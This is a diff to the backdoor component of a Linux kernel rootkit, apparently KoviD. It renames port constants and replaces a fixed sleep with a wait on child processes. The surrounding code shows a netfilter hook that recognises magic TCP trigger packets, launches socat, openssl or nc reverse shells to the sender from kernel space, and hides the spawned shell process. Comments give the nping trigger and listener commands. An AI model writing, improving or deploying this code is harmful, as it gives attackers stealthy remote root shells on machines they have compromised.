@@ -35,14 +35,14 @@ uint64_t auto_bdkey = 0x0000000000000000;
 #define BD_PATH_NUM 3
 #define BD_OPS_SIZE 2
 enum {
-	RR_NULL,
-	RR_NC = 80,
-	RR_OPENSSL = 443,
-	RR_SOCAT = 444,
-	RR_SOCAT_TTY = 445
+	PORT_NULL,
+	PORT_NC = 80,
+	PORT_OPENSSL = 443,
+	PORT_SOCAT = 444,
+	PORT_SOCAT_TTY = 445
 };
-static int allowed_ports[] = { RR_NC, RR_OPENSSL, RR_SOCAT, RR_SOCAT_TTY,
-			       RR_NULL };
+static int allowed_ports[] = { PORT_NC, PORT_OPENSSL, PORT_SOCAT, PORT_SOCAT_TTY,
+			       PORT_NULL };
 
 struct stat_ops_t {
 	int kv_port;
@@ -50,12 +50,29 @@ struct stat_ops_t {
 };
 static struct stat_ops_t stat_ops[] = {
 	// Adjust if you install the binaries in different locations
-	{ .kv_port = RR_OPENSSL,
+	{ .kv_port = PORT_OPENSSL,
 	  { "/usr/bin/openssl", "/bin/openssl", "/var/.openssl" } },
-	{ .kv_port = RR_SOCAT,
+	{ .kv_port = PORT_SOCAT,
 	  { "/bin/socat", "/var/.socat", "/usr/bin/socat" } },
-	{ .kv_port = RR_NULL }
+	{ .kv_port = PORT_NULL }
 };
+
+static int _predict_child_count(int port)
+{
+#ifdef DEBUG_RING_BUFFER
+	switch (port) {
+	case PORT_NC:
+	case PORT_SOCAT:
+	case PORT_SOCAT_TTY:
+		return 1;
+	case PORT_OPENSSL:
+		return 2;
+	default:
+		break;
+	}
+#endif
+	return 0;
+}
 
 // Iterate over stat_ops list and query FS
 // whether the binary is available
@@ -63,7 +80,7 @@ static struct stat_ops_t stat_ops[] = {
 static const char *_locate_bdbin(int port)
 {
 	int i, x;
-	for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != RR_NULL; ++i) {
+	for (i = 0; i < BD_OPS_SIZE && stat_ops[i].kv_port != PORT_NULL; ++i) {
 		if (port != stat_ops[i].kv_port)
 			continue;
 		for (x = 0; x < BD_PATH_NUM; ++x) {
@@ -87,7 +104,7 @@ static const char *_locate_bdbin(int port)
 struct kfifo_priv {
 	struct iphdr *iph;
 	struct tcphdr *tcph;
-	int select;
+	int dport;
 };
 
 struct nf_priv {
@@ -156,10 +173,10 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 {
 	short i;
 	char *bd = NULL;
-	for (i = 0; allowed_ports[i] != RR_NULL && !bd; ++i) {
+	for (i = 0; allowed_ports[i] != PORT_NULL && !bd; ++i) {
 		switch (dst_port) {
-		case RR_SOCAT_TTY: {
-			// same as RR_SOCAT but on dst port RR_SOCAT_TTY
+		case PORT_SOCAT_TTY: {
+			// same as PORT_SOCAT but on dst port PORT_SOCAT_TTY
 			// "%s OPENSSL:%s:%s,verify=0 EXEC:\"tail -F -n +1 /var/.<random>\""
 
 			char *tty = sys_get_ttyfile();
@@ -178,11 +195,11 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 						exe, ip, src_port, tty);
 			}
 		} break;
-		case RR_SOCAT: {
+		case PORT_SOCAT: {
 			// openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
 			// cat server.key server.crt > server.pem
 			// socat -d -d OPENSSL-LISTEN:<#PORT>,cert=server.pem,verify=0,fork STDOUT
-			// trigger: nping <IP> --tcp -p RR_SOCAT --flags fin,urg,ack --source-port <#PORT> -c 1
+			// trigger: nping <IP> --tcp -p PORT_SOCAT --flags fin,urg,ack --source-port <#PORT> -c 1
 			int len;
 			char ip[INET_ADDRSTRLEN + 1] = { 0 };
 			snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
@@ -196,10 +213,10 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 					"%s OPENSSL:%s:%u,verify=0 EXEC:/bin/bash",
 					exe, ip, src_port);
 		} break;
-		case RR_OPENSSL: {
+		case PORT_OPENSSL: {
 			// openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
 			// openssl s_server -key key.pem -cert cert.pem -accept <#PORT>
-			// trigger: nping <IP> --tcp -p RR_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
+			// trigger: nping <IP> --tcp -p PORT_OPENSSL --flags fin,urg,ack --source-port <#PORT> -c 1
 			char *ssl = sys_get_sslfile();
 			if (ssl) {
 				int len;
@@ -219,9 +236,9 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 						ssl);
 			}
 		} break;
-		case RR_NC: {
+		case PORT_NC: {
 			// nc <IP> -lvp <#PORT>
-			// trigger: nping <IP> --tcp -p RR_NC --flags fin,urg,ack --source-port <#PORT> -c 1
+			// trigger: nping <IP> --tcp -p PORT_NC --flags fin,urg,ack --source-port <#PORT> -c 1
 			int len;
 			char ip[INET_ADDRSTRLEN + 1] = { 0 };
 			snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
@@ -240,9 +257,38 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port, __be32 saddr,
 	return bd;
 }
 
+static bool _wait_for_children(struct task_struct *task, int default_child_count)
+{
+	unsigned long tmout_jiffies = msecs_to_jiffies(500);
+	unsigned long start_jiffies = jiffies;
+
+	if (!task)
+		return false;
+
+	while (time_before(jiffies, start_jiffies + tmout_jiffies)) {
+		int actual_count = 0;
+		struct task_struct *child;
+
+		rcu_read_lock();
+
+		list_for_each_entry (child, &task->children, sibling) {
+			actual_count++;
+		}
+		rcu_read_unlock();
+
+		if (actual_count >= default_child_count) {
+			return true;
+		}
+
+		msleep(50);
+	}
+	return false;
+}
+
 // Execute backdoor that can be either regular
 // or reverse shell
-static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
+static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int port,
+			 int default_child_count)
 {
 	char *argv[] = { "/bin/bash", "-c", NULL, NULL };
 	char *envp[] = { "HOME=/", "TERM=linux", NULL };
@@ -251,18 +297,18 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
 	struct subprocess_info *info;
 	__be32 saddr = iph->saddr;
 	const char *binpath =
-		_locate_bdbin(select == RR_SOCAT_TTY ? RR_SOCAT : select);
+		_locate_bdbin(port == PORT_SOCAT_TTY ? PORT_SOCAT : port);
 	char *rev;
 
-	if (select != RR_NC && !binpath) {
+	if (port != PORT_NC && !binpath) {
 		prwarn("Could not find executable associated with port %d\n",
-		       select);
+		       port);
 		return ret;
 	}
 
-	rev = _build_bd_command(binpath, select, saddr, htons(tcph->source));
+	rev = _build_bd_command(binpath, port, saddr, htons(tcph->source));
 	if (!rev) {
-		prwarn("Invalid port selection: %d\n", select);
+		prwarn("Invalid port selection: %d\n", port);
 		return ret;
 	}
 
@@ -273,17 +319,23 @@ static int _run_backdoor(struct iphdr *iph, struct tcphdr *tcph, int select)
 		ret = call_usermodehelper_exec(info, UMH_WAIT_EXEC);
 	}
 
+	if (ret == 0) {
+		bool __attribute__((unused))rc = _wait_for_children(
+				get_pid_task(find_get_pid(shellpid), PIDTYPE_PID),
+				default_child_count);
 
-	// wait a little while before the
-	// children are ready and inform about new parent PID
-	msleep(300);
+#ifdef DEBUG_RING_BUFFER
+		if (!rc) {
+			int estimated = _predict_child_count(port);
+			prwarn("Warning: revshell pid %d don't match expected children count of %d\n", shellpid, estimated);
+		}
+#endif
 
-	if (!ret) {
+		// Hide straight-away what we've got
 		kv_hide_task_by_pid(shellpid, saddr, false);
 	}
 
 	kv_mem_free(&rev);
-
 	return ret;
 }
 
@@ -441,7 +493,8 @@ static int _bd_watchdog(void *t)
 		prinfo("Got event\n");
 		// read data set by nf_hook
 		if (_get_fifo(&kf)) {
-			_run_backdoor(kf->iph, kf->tcph, kf->select);
+			int default_child_count = _predict_child_count(kf->dport);
+			_run_backdoor(kf->iph, kf->tcph, kf->dport, default_child_count);
 			kfree(kf);
 		}
 	}
@@ -517,10 +570,10 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
 		struct kfifo_priv *kf;
 		struct tcphdr *tcph =
 			(struct tcphdr *)skb_transport_header(skb);
-		int dst = _check_bdports(htons(tcph->dest));
+		int dport = _check_bdports(htons(tcph->dest));
 
 		// Silence libpcap?
-		if (dst == RR_NULL || !kv_check_bdkey(tcph, skb))
+		if (dport == PORT_NULL || !kv_check_bdkey(tcph, skb))
 			goto leave;
 
 		kf = kzalloc(sizeof(struct kfifo_priv), GFP_KERNEL);
@@ -531,7 +584,7 @@ static unsigned int _sock_hook_nf_cb(void *priv, struct sk_buff *skb,
 
 		kf->iph = iph;
 		kf->tcph = tcph;
-		kf->select = dst;
+		kf->dport = dport;
 
 		// setup data so can be read from backdoor code
 		_put_fifo(kf);
